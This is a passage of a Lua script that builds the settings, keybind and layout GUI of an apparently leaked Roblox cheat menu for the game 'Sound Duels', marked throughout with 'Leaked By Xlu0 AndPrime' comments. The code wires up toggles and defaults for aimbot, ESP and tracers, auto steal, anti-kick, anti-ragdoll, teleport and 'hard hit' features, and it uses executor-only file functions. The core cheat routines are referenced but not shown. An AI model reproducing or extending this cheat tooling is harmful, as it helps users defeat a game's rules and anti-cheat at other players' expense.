    selectedSetter(index == 0 and "" or ("rbxassetid://" .. tostring(assetIds[index])))
    updateButtons()
end

local function makeThumb(index,assetId)
    local thumb = Instance.new("ImageButton")
    thumb.Name = "Thumb" .. tostring(index)
    thumb.ZIndex = 5
    thumb.LayoutOrder = index + 1
    thumb.Size = UDim2.new(0,42,0,34)
    thumb.BackgroundColor3 = Color3.fromRGB(0,0,0)
    thumb.BorderSizePixel = 0
    thumb.Image = assetId and ("rbxassetid://" .. tostring(assetId)) or ""
    thumb.ImageTransparency = 0.22
    thumb.ScaleType = Enum.ScaleType.Crop
    thumb.AutoButtonColor = false
    thumb.Parent = scroll
    corner(thumb,9)
    stroke(thumb,Color3.fromRGB(81, 81, 81),1,0.4)

    if index == 0 then
        local none = Instance.new("TextLabel")
        none.Name = "NoneLabel"
        none.ZIndex = 6
        none.Size = UDim2.new(1,0,1,0)
        none.BackgroundTransparency = 1
        none.Text = "NONE"
        none.TextColor3 = COLORS.white
        none.TextSize = 9
        none.Font = Enum.Font.GothamMedium
        none.Parent = thumb
    end

    buttons[index] = thumb
    thumb.MouseButton1Click:Connect(function() choose(index) end)
end

makeThumb(0,nil)
for i,id in ipairs(assetIds) do
    makeThumb(i,id)
end

local left = Instance.new("TextButton")
left.ZIndex = 8
left.Position = UDim2.new(0,3,0.5,-17)
left.Size = UDim2.new(0,22,0,34)
left.BackgroundColor3 = Color3.fromRGB(19, 19, 19)
left.BackgroundTransparency = 0.05
left.BorderSizePixel = 0
left.Text = "<"
left.TextColor3 = COLORS.white
left.TextSize = 18
left.Font = Enum.Font.GothamMedium
left.AutoButtonColor = false
left.Parent = pickerRow
corner(left,7)

local right = Instance.new("TextButton")
right.ZIndex = 8
right.Position = UDim2.new(1,-25,0.5,-17)
right.Size = UDim2.new(0,22,0,34)
right.BackgroundColor3 = Color3.fromRGB(19, 19, 19)
right.BackgroundTransparency = 0.05
right.BorderSizePixel = 0
right.Text = ">"
right.TextColor3 = COLORS.white
right.TextSize = 18
right.Font = Enum.Font.GothamMedium
right.AutoButtonColor = false
right.Parent = pickerRow
corner(right,7)

left.MouseButton1Click:Connect(function()
    local pos = scroll.CanvasPosition
    TweenService:Create(scroll,TweenInfo.new(0.2),{
        CanvasPosition = Vector2.new(math.max(0,pos.X-50),0)
    }):Play()
end)

right.MouseButton1Click:Connect(function()
    local pos = scroll.CanvasPosition
    TweenService:Create(scroll,TweenInfo.new(0.2),{
        CanvasPosition = Vector2.new(pos.X+50,0)
    }):Play()
end)

updateButtons()
return pickerRow
end

-- Image pickers removed: random assets applied on execute
end

do
local row = baseRow(Settings, "Reset Mobile Buttons", 15)
local button = Instance.new("TextButton")
button.Name = "ResetMobileButtons"
button.BackgroundColor3 = Color3.fromRGB(233, 233, 233)
button.BackgroundTransparency = 0
button.BorderSizePixel = 0
button.Text = "RESET"
button.TextColor3 = Color3.fromRGB(0, 0, 0)
button.TextSize = 11
button.Font = Enum.Font.GothamMedium
button.AutoButtonColor = false
button.Size = UDim2.new(0, 78, 0, 26)
button.Position = UDim2.new(1, -88, 0.5, -13)
button.ZIndex = 7
button.Parent = row
corner(button, 8)
stroke(button, Color3.fromRGB(255, 255, 255), 1, 0.18)
button.Activated:Connect(function()
if _G.SoundResetMobileButtons then
_G.SoundResetMobileButtons()
else
_G.SoundMobileButtonScale = SoundAutoMobile and 0.90 or 1.00
_G.SoundHideMobileButtons = false
if _G.SoundApplyMobileButtonsHidden then _G.SoundApplyMobileButtonsHidden() end
if _G.SoundApplyMobileButtonSize then _G.SoundApplyMobileButtonSize() end
if saveSoundConfig then pcall(saveSoundConfig) end
end
end)
end

-- INTRO UI REMOVED

section(Settings, "SETTINGS", 999)
local resetHolder = Instance.new("Frame")
resetHolder.Name = "Reset All Settings Holder"
resetHolder.BackgroundTransparency = 1
resetHolder.BorderSizePixel = 0
resetHolder.Size = UDim2.new(1,-4,0,34)
resetHolder.LayoutOrder = 1000
resetHolder.ZIndex = 5
resetHolder.Parent = Settings
local resetBtn = Instance.new("TextButton")
resetBtn.Name = "Reset All Settings"
resetBtn.BackgroundColor3 = COLORS.row
resetBtn.BackgroundTransparency = 0.3
resetBtn.BorderSizePixel = 0
resetBtn.Text = "RESET ALL SETTINGS"
resetBtn.TextColor3 = COLORS.white
resetBtn.TextStrokeTransparency = 1
resetBtn.TextSize = 12
resetBtn.Font = Enum.Font.GothamMedium
resetBtn.AutoButtonColor = false
resetBtn.Size = UDim2.new(1,0,1,0)
resetBtn.Position = UDim2.new(0,0,0,0)
resetBtn.ZIndex = 6
resetBtn.Parent = resetHolder
corner(resetBtn,9)
local resetStroke = Instance.new("UIStroke")
resetStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
resetStroke.Color = Color3.fromRGB(255, 255, 255)
resetStroke.Thickness = 1
resetStroke.Transparency = 0.12
resetStroke.Parent = resetBtn
local resetDefaultBg = COLORS.row
local resetHoverBg = COLORS.row
local resetConfirmBg = COLORS.row
local resetDoneBg = COLORS.row
local resetDefaultText = COLORS.white
local resetConfirmText = COLORS.white
local resetDoneText = COLORS.white
local confirmState = false
local confirmTimer = nil
function setResetDefaultTheme()
confirmState = false
resetBtn.Text = "RESET ALL SETTINGS"
resetBtn.TextColor3 = resetDefaultText
tween(resetBtn, {BackgroundColor3 = resetDefaultBg}, 0.18)
tween(resetStroke, {Color = Color3.fromRGB(255, 255, 255), Transparency = 0.12, Thickness = 1}, 0.18)
end
function setResetConfirmTheme()
resetBtn.Text = "CLICK AGAIN TO CONFIRM"
resetBtn.TextColor3 = resetConfirmText
tween(resetBtn, {BackgroundColor3 = resetConfirmBg}, 0.18)
tween(resetStroke, {Color = resetConfirmText, Transparency = 0.02, Thickness = 1.4}, 0.18)
end
function setResetDoneTheme()
resetBtn.Text = "DONE"
resetBtn.TextColor3 = resetDoneText
tween(resetBtn, {BackgroundColor3 = resetDoneBg}, 0.18)
tween(resetStroke, {Color = resetDoneText, Transparency = 0.02, Thickness = 1.4}, 0.18)
end
resetBtn.Text = "RESET ALL SETTINGS"
resetBtn.MouseEnter:Connect(function()
if not confirmState then
tween(resetBtn, {BackgroundColor3 = resetHoverBg}, 0.12)
end
end)


--Leaked By Xlu0 AndPrime--
local saveHolder = Instance.new("Frame")
saveHolder.Name = "Save Config Holder"
saveHolder.BackgroundTransparency = 1
saveHolder.BorderSizePixel = 0
saveHolder.Size = UDim2.new(1,-4,0,34)
saveHolder.LayoutOrder = 1001
saveHolder.ZIndex = 5
saveHolder.Parent = Settings

local saveBtn = Instance.new("TextButton")
saveBtn.Name = "Save Config"
saveBtn.BackgroundColor3 = COLORS.row
saveBtn.BackgroundTransparency = 0.3
saveBtn.BorderSizePixel = 0
saveBtn.Text = "SAVE SETTINGS"
saveBtn.TextColor3 = resetDefaultText
saveBtn.TextStrokeTransparency = 1
saveBtn.TextSize = 12
saveBtn.Font = Enum.Font.GothamMedium
saveBtn.AutoButtonColor = false
saveBtn.Size = UDim2.new(1,0,1,0)
saveBtn.Position = UDim2.new(0,0,0,0)
saveBtn.ZIndex = 6
saveBtn.Parent = saveHolder
corner(saveBtn,9)

local saveStroke = Instance.new("UIStroke")
saveStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
saveStroke.Color = Color3.fromRGB(255, 255, 255)
saveStroke.Thickness = 1
saveStroke.Transparency = 0.12
saveStroke.Parent = saveBtn

saveBtn.MouseEnter:Connect(function()
tween(saveBtn, {BackgroundColor3 = COLORS.row}, 0.12)
end)

saveBtn.MouseLeave:Connect(function()
tween(saveBtn, {BackgroundColor3 = COLORS.row}, 0.12)
end)

saveBtn.MouseButton1Click:Connect(function()
if _G.SoundManualSaveConfig then
local ok = pcall(_G.SoundManualSaveConfig)
if ok then
saveBtn.Text = "SAVED"
saveBtn.TextColor3 = resetDoneText
tween(saveBtn, {BackgroundColor3 = resetDoneBg}, 0.18)
tween(saveStroke, {Color = resetDoneText, Transparency = 0.02, Thickness = 1.4}, 0.18)
task.delay(0.8, function()
if saveBtn and saveBtn.Parent then
saveBtn.Text = "SAVE SETTINGS"
saveBtn.TextColor3 = resetDefaultText
tween(saveBtn, {BackgroundColor3 = COLORS.row}, 0.18)
tween(saveStroke, {Color = Color3.fromRGB(255,255,255), Transparency = 0.12, Thickness = 1}, 0.18)
end
end)
else
saveBtn.Text = "SAVE FAILED"
task.delay(0.8, function()
if saveBtn and saveBtn.Parent then
saveBtn.Text = "SAVE SETTINGS"
saveBtn.TextColor3 = resetDefaultText
end
end)
end
end
end)

resetBtn.MouseLeave:Connect(function()
if not confirmState then
tween(resetBtn, {BackgroundColor3 = resetDefaultBg}, 0.12)
end
end)
resetBtn.MouseButton1Click:Connect(function()
if not confirmState then
confirmState = true
setResetConfirmTheme()
if confirmTimer then task.cancel(confirmTimer) end
confirmTimer = task.delay(3, function()
setResetDefaultTheme()
end)
return
end
if confirmTimer then
task.cancel(confirmTimer)
confirmTimer = nil
end
resetBtn.Text = "RESETTING..."
pcall(function()
local files = {
CONFIG_FILE,
KEYBINDS_CONFIG_FILE,
"Sound Duels_MainGUI_Config.json",
"Sound Duels_Config.json",
"Sound Duels_Settings.json",
"Sound Duels_Keybinds.json",
"Sound Duels_GUI.json",
}
for _, fname in ipairs(files) do
pcall(function()
if fname and isfile and isfile(fname) and delfile then
delfile(fname)
end
end)
end
end)
pcall(function()
aceGuiScaleValue = SoundAutoMobile and 0.67 or 1.00
aceProgressBarScaleValue = SoundAutoMobile and 0.83 or 1.00
NS = 60; CS = 30; LAGGER_SPEED = 29; LAGGER_CARRY_SPEED = 15
currentSpeedMode = "Normal"
autoCarrySpeedEnabled = false
autoTPHeight = 20
autoStealEnabled = false; selectedStealMode = "Auto Steal V3"; autoStealRadius = 63
_G.SoundStealRadii = {Normal = 62, Semi = 9}
selectedAnimationPack = "OFF"; selectedAimbotMode = "Normal"
AIMBOT_SPEED = 58; LAGGER_AIMBOT_SPEED = 40
_G.SoundAntiBypassAimbotSpeed = 58; _G.SoundAntiBypassLaggerAimbotSpeed = 40; ANTI_DESYNC_AIMBOT_SPEED = 58
autoSwingEnabled = false; mirrorTPDownEnabled = false; antiDesyncAutoSwingEnabled = false
_G.SoundNormalAimbotOn = false; _G.SoundAntiBypassAimbotOn = false; _G.SoundAntiDesyncAimbotOn = false
antiRagdollEnabled = false; infJumpEnabled = false; autoTPEnabled = false
batCounterEnabled = false; medCounterEnabled = false; antiKickEnabled = false; autoResetOnMedEnabled = false
espEnabled = false; espLineEnabled = false; showTracerEnabled = false; ragdollCountdownEnabled = false
fpsBoostEnabled = false; antiLagVisualEnabled = false; nukeOptimiserEnabled = false
fovEnabled = false; fovValue = 70; noCamCollisionEnabled = false; _G.SoundNoPlayerCollisionEnabled = false
skyTheme = "Off"; currentBackground = 0
selectedIntroMusic = 1; _introEnabled = true
if setIntroVisual then setIntroVisual(_introEnabled) end
if setIntroSongVisual then setIntroSongVisual() end
stopIntroPlayback(); stopIntroPreview()
autoLeftEnabled = false; autoRightEnabled = false
_G.SoundGuiLocked = false; _G.SoundHideMobileButtons = false; _G.SoundMobileButtonScale = SoundAutoMobile and 0.90 or 1.00; _G.SoundMobileButtonShape = "ROUNDED"
_G.SoundHiddenMobileButtons = {}
if _G.SoundApplyMobileButtonVisibility then pcall(_G.SoundApplyMobileButtonVisibility) end
if _G.SoundRefreshButtonVisibilityRows then pcall(_G.SoundRefreshButtonVisibilityRows) end
_G.SoundMobileButtonImage = ""
_G.SoundStealUIImage = ""
aceMainScale.Scale = aceGuiScaleValue
applySoundProgressBarScale()
applyBackground(0)
updateBackgroundButtons()
applyDefaultSoundKeybinds()
refreshAllSpeedKeybinds()
refreshTPDownKeybind()
if stopAutoTP then stopAutoTP() end
if stopAntiRagdoll then stopAntiRagdoll() end
if normalSpeedBox then normalSpeedBox.Text = tostring(NS) end
if carrySpeedBox then carrySpeedBox.Text = tostring(CS) end
if laggerSpeedBox then laggerSpeedBox.Text = tostring(LAGGER_SPEED) end
if laggerCarrySpeedBox then laggerCarrySpeedBox.Text = tostring(LAGGER_CARRY_SPEED) end
if autoTPHeightBox then autoTPHeightBox.Text = tostring(autoTPHeight) end
if radiusBox then radiusBox.Text = tostring(autoStealRadius) end
if _G.SoundRefreshAimbotSpeedBoxes then _G.SoundRefreshAimbotSpeedBoxes() end
if type(applyCustomSky) == "function" then applyCustomSky("Off") end
if skyValueLabel then skyValueLabel.Text = "Off" end
if _G.SoundResetMobileButtons then _G.SoundResetMobileButtons() end
pcall(function() if _G.SoundApplyMobileButtonImage then _G.SoundApplyMobileButtonImage() end end)
pcall(function() if _G.SoundApplyStealUIImage then _G.SoundApplyStealUIImage() end end)
if _G.SoundDuelsApplySavedGameplayStates then _G.SoundDuelsApplySavedGameplayStates() end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
task.wait(0.35)
setResetDoneTheme()
task.wait(0.8)
setResetDefaultTheme()
end)
end
task.wait()
_G.__SoundDuelsSetupSettingsUI()
pcall(function() _G.SoundInstallFontRow() end)
if (_G.SoundCustomFontSelected or "None") ~= "None" then
    task.defer(function()
        task.wait(0.2)
        pcall(function() _G.SoundApplyCustomFont(_G.SoundCustomFontSelected) end)
    end)
end
if SoundUpdateGuiLockVisual then SoundUpdateGuiLockVisual() end
if _G.SoundApplyMobileButtonsHidden then _G.SoundApplyMobileButtonsHidden() end

task.defer(function()
task.wait(0.05)
pcall(function()
    local function hideAll(page)
        if not page then return end
        for _,o in ipairs(page:GetChildren()) do
            if not o:IsA("UIListLayout") and not o:IsA("UIPadding") then
                o.Visible = false
            end
        end
    end
    local function showObj(o, order, labelText)
        if not o then return end
        o.Visible = true
        if order then o.LayoutOrder = order end
        if labelText then
            if o:IsA("TextLabel") then o.Text = labelText end
            local lbl = o:FindFirstChild("Label")
            if lbl then lbl.Text = labelText end
        end
    end
    local function byName(page, name)
        return page and page:FindFirstChild(name)
    end
    local function showNamed(page, name, order, labelText)
        showObj(byName(page,name), order, labelText)
    end

    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    if _G.SoundDropModeMainRow then
        _G.SoundDropModeMainRow.Parent = Movement
        _G.SoundDropModeMainRow.LayoutOrder = 10
    end
    if _G.SoundDropSelector then
        _G.SoundDropSelector.Parent = Movement
        _G.SoundDropSelector.LayoutOrder = 10.1
    end

    if not byName(Movement,"DROP BRAINROT") then section(Movement,"DROP BRAINROT",9) end

    if not byName(Movement,"TP Down") then
        local r,setV = _G.SoundActionToggleRow(Movement,"TP Down",false,12)
        local b = r and r:FindFirstChild("ToggleButton")
        if b then
            b.Activated:Connect(function()
                if runTPFloor then pcall(runTPFloor) end
                if setV then
                    setV(true)
                    task.delay(0.12,function() pcall(setV,false) end)
                end
            end)
        end
    end

    if not byName(Movement,"Unwalk") then
        local r,setV = toggleRow(Movement,"Unwalk",unwalkEnabled,18)
        local b = r and r:FindFirstChild("ToggleButton")
        if b then
            b.Activated:Connect(function()
                unwalkEnabled = not unwalkEnabled
                if unwalkEnabled then
                    if enableUnwalk then pcall(enableUnwalk) end
                else
                    if disableUnwalk then pcall(disableUnwalk) end
                end
                if setV then setV(unwalkEnabled) end
            end)
        end
    end

    hideAll(Movement)
    showNamed(Movement,"AUTO SPEED",0)
    showNamed(Movement,"Auto Carry Speed",0.5)
    showNamed(Movement,"NORMAL SPEED",1,"SPEED CONFIGURATION")
    showNamed(Movement,"Normal Speed",2)
    showNamed(Movement,"Carry Speed",3)

    local modeCount = 0
    for _,o in ipairs(Movement:GetChildren()) do
        if o.Name == "Mode" then
            modeCount = modeCount + 1
            showObj(o, modeCount == 1 and 4 or 8)
        end
    end

    showNamed(Movement,"LAGGER SPEED",5,"LAGGER CONFIGURATION")
    showNamed(Movement,"Lagger Speed",6,"Lagger Normal Speed")
    showNamed(Movement,"Lagger Carry Speed",7)
    showNamed(Movement,"DROP BRAINROT",9)
    showNamed(Movement,"Drop",10)
    if _G.SoundDropSelector then _G.SoundDropSelector.Visible = _G.SoundDropExpanded == true end
    showNamed(Movement,"TELEPORT",11,"TP DOWN")
    showNamed(Movement,"TP Down",12)
    showNamed(Movement,"Auto TP Down",13)
    showNamed(Movement,"Auto TP Height",14)
    showNamed(Movement,"JUMP",15)
    showNamed(Movement,"Infinite Jump",16)
    if _G.SoundInfJumpSelector then _G.SoundInfJumpSelector.LayoutOrder=16.1 end
    showNamed(Movement,"Anti Ragdoll",17)
    if _G.SoundAntiRagdollSelector then
        _G.SoundAntiRagdollSelector.Visible = false
        _G.SoundAntiRagdollSelector.Size = UDim2.new(1,-4,0,0)
    end
    if _G.SoundAntiRagdollArrow then
        _G.SoundAntiRagdollArrow.Visible = false
    end
    showNamed(Movement,"Unwalk",18)

    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    if not byName(Combat,"SEMI Range") then
        local r,b = textboxRow(Combat,"SEMI Range",tostring((_G.SoundStealRadii and _G.SoundStealRadii.Semi) or 9),3)
        b.FocusLost:Connect(function()
            _G.SoundStealRadii = _G.SoundStealRadii or {}
            local n = tonumber(b.Text)
            if n then _G.SoundStealRadii.Semi = math.clamp(n,1,500) end
            b.Text = tostring(_G.SoundStealRadii.Semi or 9)
            if _G.SoundSemiAutoStealSetRadius then
                pcall(_G.SoundSemiAutoStealSetRadius,_G.SoundStealRadii.Semi or 9)
            end
        end)
    end

    if not byName(Combat,"BAT AIMBOT") then section(Combat,"BAT AIMBOT",5) end
    if aimbotMainRow then
        aimbotMainRow.LayoutOrder = 6
        local l = aimbotMainRow:FindFirstChild("Label")
        if l then l.Text = "Bat Aimbot" end
    end
    if aimbotSpeedRow then
        aimbotSpeedRow.LayoutOrder = 7
        local l = aimbotSpeedRow:FindFirstChild("Label")
        if l then l.Text = "Auto Bat Speed" end
    end
    if _G.SoundNormalAutoSwingRow then _G.SoundNormalAutoSwingRow.LayoutOrder = 8 end
    if _G.SoundMirrorTPDownRow then
        _G.SoundMirrorTPDownRow.LayoutOrder = 9
        local l = _G.SoundMirrorTPDownRow:FindFirstChild("Label")
        if l then l.Text = "Mirror TP" end
    end

    if not byName(Combat,"AUTO PATH") then section(Combat,"AUTO PATH",12) end
    if not byName(Combat,"Auto Left") then
        local r,setV = _G.SoundActionToggleRow(Combat,"Auto Left",autoLeftEnabled,13)
        local b=r and r:FindFirstChild("ToggleButton")
        if b then b.Activated:Connect(function()
            if _G.SoundSetAutoLeft then _G.SoundSetAutoLeft(not autoLeftEnabled) end
            if setV then setV(autoLeftEnabled) end
        end) end
    end
    if not byName(Combat,"Auto Right") then
        local r,setV = _G.SoundActionToggleRow(Combat,"Auto Right",autoRightEnabled,14)
        local b=r and r:FindFirstChild("ToggleButton")
        if b then b.Activated:Connect(function()
            if _G.SoundSetAutoRight then _G.SoundSetAutoRight(not autoRightEnabled) end
            if setV then setV(autoRightEnabled) end
        end) end
    end

    if not byName(Combat,"BODY LOCK") then section(Combat,"BODY LOCK",19) end

    hideAll(Combat)
    showNamed(Combat,"AUTO STEAL",1,"STEAL CONFIGURATION")
    showNamed(Combat,"Radius",2)
    showNamed(Combat,"SEMI Range",3)
    showNamed(Combat,"Auto Steal",4)
    if _G.SoundStealSelector then _G.SoundStealSelector.LayoutOrder=4.1 end

    showNamed(Combat,"BAT AIMBOT",5)
    showObj(aimbotMainRow,6)
    if aimbotSelector then aimbotSelector.LayoutOrder=6.1 end
    showObj(aimbotSpeedRow,7)
    showObj(_G.SoundNormalAutoSwingRow,8)
    showObj(_G.SoundMirrorTPDownRow,9)

    showNamed(Combat,"AUTO PATH",12)
    showNamed(Combat,"Auto Left",13)
    showNamed(Combat,"Auto Right",14)
    showNamed(Combat,"COUNTERS",15)
    showNamed(Combat,"Bat Counter",16)
    showNamed(Combat,"Med Counter",17,"Medusa Counter")
    showNamed(Combat,"Auto Reset On Med Fling",18,"Reset After Med")
        showNamed(Combat,"BODY LOCK",19)
    showNamed(Combat,"Body Lock",20)
    if _G.SoundBodyLockSettings then
        _G.SoundBodyLockSettings.LayoutOrder=21
        local l=_G.SoundBodyLockSettings:FindFirstChild("Label")
        if l then l.Text="Lock Radius" end
    end

    --Leaked By Xlu0 AndPrime--
    showNamed(Combat,"HARD HIT",22)
    showNamed(Combat,"Hard Hit",23)
    showNamed(Combat,"Hard Hit Range",24)
    showNamed(Combat,"Hard Hit Stage+",25)
    showNamed(Combat,"Stage+ Impulse",26)

    showNamed(Combat,"PERFECT HIT",27)
    showNamed(Combat,"Perfect Hit",28)
    showNamed(Combat,"Perfect Hit Range",29)



    hideAll(Keybinds)
    showNamed(Keybinds,"MOVEMENT KEYBINDS",1)
    showNamed(Keybinds,"Speed Key",2)
    showNamed(Keybinds,"Lagger Mode Key",3)
    showNamed(Keybinds,"Drop Brainrot",4,"Drop Key")
    showNamed(Keybinds,"TP Down",5,"TP Down Key")
    showNamed(Keybinds,"COMBAT KEYBINDS",6)
    showNamed(Keybinds,"Normal Aimbot",7,"Bat Aimbot Key")
    showNamed(Keybinds,"Auto Left",9,"Auto Left Key")
    showNamed(Keybinds,"Auto Right",10,"Auto Right Key")
    showNamed(Keybinds,"EXTRA KEYBINDS",11)
    showNamed(Keybinds,"Insta Reset",12)
    showNamed(Keybinds,"Bat V2",13)
    
    if not byName(Keybinds,"INTERFACE KEYBINDS") then section(Keybinds,"INTERFACE KEYBINDS",12) end
    showNamed(Keybinds,"INTERFACE KEYBINDS",12)

    local uiToggleRow = byName(Settings,"Toggle UI")
    if uiToggleRow then
        uiToggleRow.Parent = Keybinds
        uiToggleRow.LayoutOrder = 13
        uiToggleRow.Visible = true
        local l=uiToggleRow:FindFirstChild("Label")
        if l then l.Text="UI Toggle Key" end
    end

    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    -- ColorThemePicker removed
    local barSize = byName(MenuCustomize,"Progress Bar Size") or byName(Settings,"Progress Bar Size")
    if barSize then
        barSize.Parent = Settings
        barSize.LayoutOrder = 18
        barSize.Visible = true
    end

    hideAll(MenuCustomize)

    local controllerBindButtons = {}
    local function ctrlBind(label, order)
        local r=baseRow(MenuCustomize,label,order)

        local b=Instance.new("TextButton")
        b.Name="ControllerKeybindButton"
        b.BackgroundColor3=Color3.fromRGB(8, 8, 8)
        b.BackgroundTransparency=0.18
        b.BorderSizePixel=0
        b.Text="NONE"
        b.TextColor3=COLORS.white
        b.TextSize=12
        b.Font=Enum.Font.GothamMedium
        b.AutoButtonColor=false
        b.Size=UDim2.new(0,56,0,22)
        b.Position=UDim2.new(1,-64,0.5,-11)
        b.ZIndex=8
        b.Parent=r
        corner(b,7)
        stroke(b,COLORS.strokeSoft,1,0.45)

        --Leaked By Xlu0 AndPrime--
        local clear=Instance.new("TextButton")
        clear.Name="ClearControllerKeybindButton"
        clear.BackgroundColor3=Color3.fromRGB(8, 8, 8)
        clear.BackgroundTransparency=0.08
        clear.BorderSizePixel=0
        clear.Text=""
        clear.AutoButtonColor=false
        clear.Size=UDim2.new(0,18,0,18)
        clear.Position=UDim2.new(1,-86,0.5,-9)
        clear.ZIndex=9
        clear.Parent=r
        corner(clear,999)
        stroke(clear,COLORS.strokeSoft,1,0.45)

        clear.MouseButton1Click:Connect(function()
            b.Text="NONE"
        end)

        table.insert(controllerBindButtons,b)
        return r,b
    end

    local resetCtrl=baseRow(MenuCustomize,"RESET ALL CONTROLLER",1)
    resetCtrl:FindFirstChild("Label").Text="RESET ALL CONTROLLER"
    local resetCtrlClick=Instance.new("TextButton")
    resetCtrlClick.Size=UDim2.new(1,0,1,0)
    resetCtrlClick.BackgroundTransparency=1
    resetCtrlClick.Text=""
    resetCtrlClick.ZIndex=20
    resetCtrlClick.Parent=resetCtrl
    resetCtrlClick.MouseButton1Click:Connect(function()
        for _,b in ipairs(controllerBindButtons) do b.Text="NONE" end
    end)

    section(MenuCustomize,"MOVEMENT CONTROLLER",2)
    ctrlBind("Speed Key",3); ctrlBind("Lagger Mode Key",4); ctrlBind("Drop Key",5); ctrlBind("TP Down Key",6)
    section(MenuCustomize,"COMBAT CONTROLLER",7)
    ctrlBind("Bat Aimbot Key",8); ctrlBind("Auto Left Key",10); ctrlBind("Auto Right Key",11)
    section(MenuCustomize,"INTERFACE CONTROLLER",13)
    ctrlBind("UI Toggle Key",14)

    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    if not byName(Utility,"Animation Pack") then
        animationPackRow(Utility,7)
    end

    if not byName(Utility,"Show Tracer") then
        local r,setV=toggleRow(Utility,"Show Tracer",showTracerEnabled,3)
        local b=r and r:FindFirstChild("ToggleButton")
        if b then b.Activated:Connect(function()
            showTracerEnabled=not showTracerEnabled
            if BoxedESPOptions then BoxedESPOptions.tracer=showTracerEnabled end
            if refreshBoxedESP then pcall(refreshBoxedESP) end
            if setV then setV(showTracerEnabled) end
        end) end
        setTracerESPVisual=setV
    end

    if not byName(Utility,"Ragdoll Countdown") then
        local r,setV=toggleRow(Utility,"Ragdoll Countdown",ragdollCountdownEnabled,4)
        local b=r and r:FindFirstChild("ToggleButton")
        if b then b.Activated:Connect(function()
            ragdollCountdownEnabled=not ragdollCountdownEnabled
            if ragdollCountdownEnabled then pcall(hookRagdollCountdown,LP.Character) else pcall(stopRagdollCountdown) end
            if setV then setV(ragdollCountdownEnabled) end
        end) end
        setRagdollCountdownVisual=setV
    end

    if not byName(Utility,"Try Hard Animation") then
        local r,setV=toggleRow(Utility,"Try Hard Animation",hitHarderAnimEnabled,8)
        local b=r and r:FindFirstChild("ToggleButton")
        if b then b.Activated:Connect(function()
            hitHarderAnimEnabled=not hitHarderAnimEnabled
            if hitHarderAnimEnabled then pcall(enableHitHarderAnim) else pcall(disableHitHarderAnim) end
            if setV then setV(hitHarderAnimEnabled) end
        end) end
    end

    hideAll(Utility)
    showNamed(Utility,"ESP",1,"PLAYERS")
    --Leaked By Xlu0 AndPrime--
    for _,o in ipairs(Utility:GetChildren()) do
        if o.Name=="ESP" then o.Visible=true end
    end
    showNamed(Utility,"ESP Line",3)
    showNamed(Utility,"Show Tracer",4)
    showNamed(Utility,"Ragdoll Countdown",5)
    if not byName(Utility,"VISUAL") then section(Utility,"VISUAL",6) end
    showNamed(Utility,"VISUAL",6)
    showNamed(Utility,"Sky Theme",7,"Custom Sky")
    showNamed(Utility,"Animation Pack",8,"Anim Pack")
    showNamed(Utility,"Try Hard Animation",9)
    showNamed(Utility,"PERFORMANCE",10)
    showNamed(Utility,"Stretch Rez",11,"Stretch Res")
    showNamed(Utility,"Anti Lag",12,"Anti-Lag")
    showNamed(Utility,"FOV",13,"FOV Change")
    showNamed(Utility,"FOV Value",14)

    --Leaked By Xlu0 AndPrime--
    --Leaked By Xlu0 AndPrime--
    if not byName(Settings,"Circle Buttons") then
        local r,setV=_G.SoundActionToggleRow(Settings,"Circle Buttons",_G.SoundMobileButtonShape=="CIRCLE",2)
        local b=r and r:FindFirstChild("ToggleButton")
        if b then b.Activated:Connect(function()
            _G.SoundMobileButtonShape=(_G.SoundMobileButtonShape=="CIRCLE") and "ROUNDED" or "CIRCLE"
            if _G.SoundApplyMobileButtonShape then _G.SoundApplyMobileButtonShape() end
            if setV then setV(_G.SoundMobileButtonShape=="CIRCLE") end
        end) end
    end

    if not byName(Settings,"Move Buttons") then
        local r,setV=_G.SoundActionToggleRow(Settings,"Move Buttons",_G.SoundGuiLocked~=true,5)
        local b=r and r:FindFirstChild("ToggleButton")
        if b then b.Activated:Connect(function()
            _G.SoundGuiLocked=not (_G.SoundGuiLocked==true)
            if setV then setV(_G.SoundGuiLocked~=true) end
            if SoundUpdateGuiLockVisual then SoundUpdateGuiLockVisual() end
            if saveSoundConfig then pcall(saveSoundConfig) end
        end) end
    end

    if not byName(Settings,"Intro Song") then
        toggleRow(Settings,"Intro Song",false,8)
    end
    if not byName(Settings,"Background Color") then
        toggleRow(Settings,"Background Color",false,15)
    end

    hideAll(Settings)
    showNamed(Settings,"MOBILE BUTTONS",1)
    showNamed(Settings,"Circle Buttons",2)
    showNamed(Settings,"Hide Mobile Buttons",3,"Hide Mob Buttons")
    showNamed(Settings,"Mobile Buttons Size",4,"Button Size %")
    showNamed(Settings,"Move Buttons",5)
    showNamed(Settings,"Reset Mobile Buttons",6,"Reset Buttons")

    if not byName(Settings,"INTERFACE") then section(Settings,"INTERFACE",7) end
    showNamed(Settings,"INTERFACE",7)
    -- showNamed(Settings,"Intro Song",8)
    -- showNamed(Settings,"Intro",9)

    if colorPicker then showObj(colorPicker,14) end
    showNamed(Settings,"Background Color",15)

    if not byName(Settings,"UI SCALE") then section(Settings,"UI SCALE",16) end
    showNamed(Settings,"UI SCALE",16)
    showNamed(Settings,"GUI Scale",17,"UI Scale")
    showNamed(Settings,"Progress Bar Size",18,"Steal Bar Size")
    if barSize then
        barSize.Parent = Settings
        barSize.LayoutOrder = 18
        barSize.Visible = true
        local lbl = barSize:FindFirstChild("Label")
        if lbl then lbl.Text = "Steal Bar Size" end
    end
    showNamed(Settings,"Save Config Holder",19)
    showNamed(Settings,"Reset All Settings Holder",20)

end)
end)
task.defer(function()
    task.wait(0.6)
    pcall(_G.SoundBuildButtonVisibilityRows)
    task.wait(1.5)
    pcall(_G.SoundBuildButtonVisibilityRows)
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
local isControllerInput = tostring(input.UserInputType):find("Gamepad") ~= nil
if gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard and not listeningForSpeedKey and not listeningForTPDownKey then return end
if UserInputService:GetFocusedTextBox() then return end
